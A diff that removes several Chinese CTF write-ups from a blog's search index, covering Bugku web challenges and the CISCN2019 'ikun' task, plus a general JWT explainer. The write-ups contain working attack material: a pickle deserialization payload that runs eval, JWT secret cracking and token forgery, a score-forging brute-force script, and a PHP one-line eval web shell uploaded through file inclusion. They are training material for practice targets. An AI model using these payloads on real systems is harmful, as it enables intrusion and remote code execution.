@@ -1,332 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Bugku Game1</title>
-    <url>/2021/05/11/Bugku-Game1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Game1"><a href="#Bugku-Game1" class="headerlink" title="Bugku Game1"></a>Bugku Game1</h1><h2 id="先瞅瞅"><a href="#先瞅瞅" class="headerlink" title="先瞅瞅"></a>先瞅瞅</h2><p>打开环境，进去是一个游戏，先玩一下，是个盖楼游戏</p>
-<p><img src="https://i.loli.net/2021/05/11/9ZFMYQcfzmRltqd.png" alt="2.png"></p>
-<p>然后查看源代码，发现下面这几句话，有一个score.php,是用来提交分数的，看到这里就不难猜到应该是分数过了某个分数就会拿到flag，这里面有三个参数，看起来分别是分数、ip以及分数的base64编码，这里随便试一下，分数先搞一个6666，然后ip就是源码里的，sign就是编码NjY2Ngo=，构造输入<code>http://114.67.246.176:19820/score.php?score=6666&amp;ip=111.33.78.4.54&amp;sign=NjY2Ngo=</code>，发现返回失败了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ppp=<span class="string">&#x27;111.33.78.4&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> sign = Base64.encode(score.toString());</span><br><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;score.php?score=&quot;</span>+score+<span class="string">&quot;&amp;ip=&quot;</span>+ppp+<span class="string">&quot;&amp;sign=&quot;</span>+sign,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
-<h2 id="上burp"><a href="#上burp" class="headerlink" title="上burp"></a>上burp</h2><p>这里我以为是输入不够大，就试了更大的数，发现还是不对，然后随便玩了下游戏，用burp抓包，看一下发送到score.php的数据包，发现score和ip都和我们的形式一样，但是sign却不是25的base64编码，25的base64编码是MjU=，数据包里是zMMjU===，再尝试一下其他分数发现都是’zM’+base64(score)+’==’，所以可能是输入构造错了</p>
-<p><img src="https://i.loli.net/2021/05/11/jQdIAX7tmhfuK35.png" alt="3.png"></p>
-<p>然后将上面构造的输入改为<code>http://114.67.246.176:19820/score.php?score=6666&amp;ip=111.33.78.4.54&amp;sign=zMNjY2Ngo===</code>，发现返回了flag，果然是因为输入的格式问题</p>
-<p><img src="https://i.loli.net/2021/05/11/7RvHw3KTNhy62bC.png" alt="4.png"></p>
-<h2 id="写个脚本"><a href="#写个脚本" class="headerlink" title="写个脚本"></a>写个脚本</h2><p>那么这个分数的阈值究竟是啥，我们写个脚本来跑一下，这里从1000开始是因为我自己玩到了1000多分还是失败了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19820/score.php?score=&quot;</span></span><br><span class="line">url2=<span class="string">&quot;&amp;ip=111.33.78.4&amp;sign=zM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1000</span>,<span class="number">100000</span>):</span><br><span class="line">    i=<span class="built_in">str</span>(i)</span><br><span class="line">    j=b64encode(i.encode())</span><br><span class="line">    j=j.decode()</span><br><span class="line">    r=requests.get(url+i+url2+j+<span class="string">&#x27;==&#x27;</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;失败了&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>最后发现到3000就出flag了</p>
-<p><img src="https://i.loli.net/2021/05/11/ZXNY1wpIJfvCdyx.png" alt="1.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>iKun</title>
-    <url>/2021/05/08/ikun/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><blockquote>
-<p>只因你太美</p>
-</blockquote>
-<h2 id="先瞅瞅"><a href="#先瞅瞅" class="headerlink" title="先瞅瞅"></a>先瞅瞅</h2><p>打开环境，开幕雷击，鸡你太美！<br><img src="https://i.loli.net/2021/05/08/9DWou4F5XmjpLKZ.png" alt="1.png"></p>
-<h2 id="再试试"><a href="#再试试" class="headerlink" title="再试试"></a>再试试</h2><p>先注册登录，盲猜会用到admin账号，尝试注册admin+空格 ,失败了，只能随便注册一下，登陆后看到左下角的一定要抢到lv6，往下滑，发现每个商品都会有一lv的标签，发现lv标签与商品图片是两个图片，也就是说可以编写脚本查找lv6.png<br><img src="https://i.loli.net/2021/05/08/Sw2uRiLjQW4UpbB.png" alt="2.png"></p>
-<p>脚本如下,得到结果为181，因此lv6在第181页，进入到第181页，找到对应商品购买，发现钱不够</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://6ec470a9-5d1d-4d73-894c-1364a0178d28.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/05/08/cUdGtBvIMKqFWhL.png" alt="3.png"></p>
-<p>看到了莫名其妙的优惠券，可能有文章，点击购买，用burp抓包，果然看到了折扣，偷偷修改为很小的数。弹出来的网页显示只能是admin才能访问，果然。<br><img src="https://i.loli.net/2021/05/08/bCxrczHuT1dogSE.png" alt="1.png"><br><img src="https://i.loli.net/2021/05/08/sRyor7zqmU8ObKc.png" alt="2.png"></p>
-<p>再观察抓到的包，使用了JWT，用jwt.io解码看看，看到了我们的用户名a，然后可以使用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>进行爆破<br><img src="https://i.loli.net/2021/05/08/71Wo9JkOIspElBg.png" alt="1.png"></p>
-<p>使用c-jwt-cracker的时候，先从GitHub下载代码，之后如果没有下载过openssl则先执行<code>sudo apt-get install libssl-dev</code>下载，之后在文件目录中执行<code>make</code>,用生成的可执行文件来进行爆破，可以得到secret为1Kun<br><img src="https://i.loli.net/2021/05/08/DvioVJIRMGfnyTQ.png" alt="2.png"></p>
-<p>之后用jwt.io生成我们需要的jwt，将username设置为admin<br><img src="https://i.loli.net/2021/05/08/OY8CjLv1xNVWdTw.png" alt="3.png"></p>
-<p>替换掉原来的jwt，就可以解锁新界面，除了利用burp，还可以直接打开浏览器的控制台，直接修改也可以<br><img src="https://i.loli.net/2021/05/08/Oiph9m8CE7WqMgA.png" alt="1.png"><br>查看网页源代码，发现了一个链接，点击下载网站的源代码，开始分析<br><img src="https://i.loli.net/2021/05/08/RgslpFaHuIO4J8G.png" alt="2.png"><br>在sshop/views/Admin.py中找到了一个反序列化点</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>构造payload获得flag</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>
-<p>运行的结果为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
-<p>将become的内容改为上面得到的序列，然后获得flag<br><img src="https://i.loli.net/2021/05/08/V2FKLk69Z78nuhI.png" alt="3.png"><br>或者直接在浏览器控制台修改也能得到flag，首先将become的hiden属性删除，就会发现出现一个输入框，输入刚才得到的序列得到flag<br><img src="https://i.loli.net/2021/05/08/o47cgzqipPJdBZU.png" alt="2.png"><br><img src="https://i.loli.net/2021/05/08/hmldG8Pn7zKW1c2.png" alt="3.png"><br><img src="https://i.loli.net/2021/05/08/dI9FLKf7MR1zcau.png" alt="4.png"></p>
-<h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p> Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
-<p>说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。</p>
-<p>我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。</p>
-<p>但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.</p>
-<p><strong>Session</strong>: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p>
-<p><strong>扩展性</strong>: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p>
-<p><strong>CSRF</strong>: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p>
-<h2 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h2><p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
-<p>流程上是这样的：</p>
-<ul>
-<li>用户使用用户名密码来请求服务器</li>
-<li>服务器进行验证用户的信息</li>
-<li>服务器通过验证发送给用户一个token</li>
-<li>客户端存储token，并在每次请求时附送上这个token值</li>
-<li>服务端验证token值，并返回数据</li>
-</ul>
-<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持 <code>CORS(&amp;#x8DE8;&amp;#x6765;&amp;#x6E90;&amp;#x8D44;&amp;#x6E90;&amp;#x5171;&amp;#x4EAB;)</code>策略，一般我们在服务端这么做就可以了 <code>Access-Control-Allow-Origin: *</code>。</p>
-<p>那么我们现在回到JWT的主题上。</p>
-<h3 id="JWT长什么样？"><a href="#JWT长什么样？" class="headerlink" title="JWT长什么样？"></a>JWT长什么样？</h3><p>JWT是由三段信息构成的，将这三段信息文本用 <code>.</code>链接一起就构成了Jwt字符串。就像这样:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
-
-<h3 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h3><p>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).</p>
-<p>jwt的头部承载两部分信息：</p>
-<ul>
-<li>声明类型，这里是jwt</li>
-<li>声明加密的算法 通常直接使用 HMAC SHA256</li>
-</ul>
-<p>完整的头部就像下面这样的JSON：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#39;typ&#39;: &#39;JWT&#39;,</span><br><span class="line">  &#39;alg&#39;: &#39;HS256&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>
-
-<p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p>
-<ul>
-<li>标准中注册的声明</li>
-<li>公共的声明</li>
-<li>私有的声明</li>
-</ul>
-<p><strong>标准中注册的声明</strong> (建议但不强制使用) ：</p>
-<ul>
-<li><p><strong>iss</strong>: jwt签发者</p>
-</li>
-<li><p><strong>sub</strong>: jwt所面向的用户</p>
-</li>
-<li><p><strong>aud</strong>: 接收jwt的一方</p>
-</li>
-<li><p><strong>exp</strong>: jwt的过期时间，这个过期时间必须要大于签发时间</p>
-</li>
-<li><p><strong>nbf</strong>: 定义在什么时间之前，该jwt都是不可用的.</p>
-</li>
-<li><p><strong>iat</strong>: jwt的签发时间</p>
-</li>
-<li><p><strong>jti</strong>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</p>
-</li>
-</ul>
-<p><strong>公共的声明</strong> ：<br>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.</p>
-<p><strong>私有的声明</strong> ：<br>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p>
-<p>定义一个payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>然后将其进行base64加密，得到Jwt的第二部分。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>
-
-<p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p>
-<ul>
-<li>header (base64后的)</li>
-<li>payload (base64后的)</li>
-<li>secret</li>
-</ul>
-<p>这个部分需要base64加密后的header和base64加密后的payload使用 <code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐 <code>secret</code>组合加密，然后就构成了jwt的第三部分。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javascript</span><br><span class="line">var encodedString &#x3D; base64UrlEncode(header) + &#39;.&#39; + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line">var signature &#x3D; HMACSHA256(encodedString, &#39;secret&#39;); &#x2F;&#x2F; TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
-
-<p>将这三部分用 <code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</strong></p>
-<p>一般是在请求头里加入 <code>Authorization</code>，并加上 <code>Bearer</code>标注：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch(&#39;api&#x2F;user&#x2F;1&#39;, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#39;Authorization&#39;: &#39;Bearer &#39; + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>服务端会验证token，如果验证通过就会返回相应的资源。整个流程就是这样的:</p>
-<ul>
-<li><p>因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。</p>
-</li>
-<li><p>因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。</p>
-</li>
-<li><p>便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。</p>
-</li>
-<li><p>它不需要在服务端保存会话信息, 所以它易于应用的扩展</p>
-</li>
-<li><p>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。</p>
-</li>
-<li><p>保护好secret私钥，该私钥非常重要。</p>
-</li>
-<li><p>如果可以，请使用https协议</p>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>2019Ciscn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web33</title>
-    <url>/2021/04/28/Bugku-Web33/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web33"><a href="#Bugku-Web33" class="headerlink" title="Bugku Web33"></a>Bugku Web33</h1><blockquote>
-<p>描述：fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</p>
-</blockquote>
-<p>下载文件，是一段php代码，提示给的字符串应该就是flag加密后得到的字符串，现在需要对其解密，得到flag，代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$data,$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">&#x27;ISCC&#x27;</span>); <span class="comment">#729623334f0aa2784a1599fd374c120d</span></span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    $mkey = <span class="string">&quot;729623334f0aa2784a1599fd374c120d&quot;</span>;</span><br><span class="line">    $klen = strlen($mkey);</span><br><span class="line">    $tmp = $str;</span><br><span class="line">    $tmp = base64_decode($tmp);  <span class="comment">// 对 base64 后的字符串 decode</span></span><br><span class="line">    $md_len = strlen($tmp); <span class="comment">//获取字符串长度</span></span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $char = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i &lt; $md_len;$i++) &#123;  <span class="comment">//  取二次加密用 key;</span></span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)  <span class="comment">// 数据长度是否超过 key 长度检测</span></span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        $char .= $mkey[$x];  <span class="comment">// 从 key 中取二次加密用 key</span></span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $md_data = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$md_len;$i++) &#123; <span class="comment">// 取偏移后密文数据</span></span><br><span class="line">        array_push($md_data, ord($tmp[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    $md_data_source = <span class="keyword">array</span>();</span><br><span class="line">    $data1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $data2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($md_data <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">// 对偏移后的密文数据进行还原</span></span><br><span class="line">        $i = $key;</span><br><span class="line">        <span class="keyword">if</span>($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125;</span><br><span class="line">        $dd = $value;</span><br><span class="line">        $od = ord($mkey[$i]);</span><br><span class="line">        array_push($md_data_source,$dd);</span><br><span class="line">        $data1 .= chr(($dd+<span class="number">128</span>)-$od);  <span class="comment">// 第一种可能, 余数+128-key 为回归数</span></span><br><span class="line">        $data2 .= chr($dd-$od);  <span class="comment">// 第二种可能, 余数直接-key 为回归数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt; &quot;</span>.$data1.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt; &quot;</span>.$data2.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str = <span class="string">&quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;</span>;</span><br><span class="line">decrypt($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web34</title>
-    <url>/2021/04/28/Bugku-Web34/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web34"><a href="#Bugku-Web34" class="headerlink" title="Bugku Web34"></a>Bugku Web34</h1><blockquote>
-<p>提示：文件包含</p>
-</blockquote>
-<p>&emsp;&emsp;进入环境，页面也没有什么特殊的地方，注意到URL中有filename，可能存在文件包含漏洞<br><img src="https://i.loli.net/2021/04/28/Z7GXlykMqLQ31d9.png" alt="3.png"></p>
-<p>&emsp;&emsp;查看源代码，发现了upload.php，访问upload.php<br><img src="https://i.loli.net/2021/04/28/bEvD3iSZYg9epwF.png" alt="4.png"></p>
-<p>&emsp;&emsp;发现了上传功能，尝试通过burpsuite修改上传马儿，发现只允许上传图片格式，不过存在文件包含漏洞，我们依然能够有办法让马儿跑，此时只需要让filename等于我们上传的图片被保存的名字也可以执行里面的马儿。写入一句话木马的时候发现直接写`<?php @eval($_POST['pass']); ?>，<?php ?>会被删除，换一种方式用script绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/28/mdWGCDFBHr3wTM1.png" alt="6.png"></p>
-<p>&emsp;&emsp;蚁剑直接连接<code>http://114.67.246.176:12372/index.php?file=upload/202104280813155137.jpg</code>,然后打开虚拟终端，在根目录cat flag就可以获得flag</p>
-<p><img src="https://i.loli.net/2021/04/28/shUgKbRLznikQt8.png" alt="5.png"></p>
-<p><img src="https://i.loli.net/2021/04/28/QpJSMKsn28O7GEP.png" alt="2.png"></p>
-<p><img src="https://i.loli.net/2021/04/28/k62vimMqDUrhGzB.png" alt="1.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web31</title>
-    <url>/2021/04/28/Bugku-Web31/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web31"><a href="#Bugku-Web31" class="headerlink" title="Bugku Web31"></a>Bugku Web31</h1><blockquote>
-<p>提示：好像需要管理员</p>
-</blockquote>
-<p>&emsp;&emsp;进来就是一个404<br><img src="https://i.loli.net/2021/04/28/iXSIzqwmAWcsyfR.png" alt="1.png"><br>&emsp;&emsp;御剑扫描发现robots.txt<br><img src="https://i.loli.net/2021/04/28/lWKLJzRFhQA4dNx.png" alt="2.png"><br>&emsp;&emsp;访问robots.txt看到resusl.php<br><img src="https://i.loli.net/2021/04/28/Z6ciQrAa4n78vGJ.png" alt="3.png"><br>&emsp;&emsp;访问resusl.php，发现需要传参x<br><img src="https://i.loli.net/2021/04/28/FqXZd9yv7KTDBmn.png" alt="4.png"><br>&emsp;&emsp;尝试admin，因为一直提示管理员，得到flag<br><img src="https://i.loli.net/2021/04/28/xDAuw1N4CvQ5tEP.png" alt="5.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
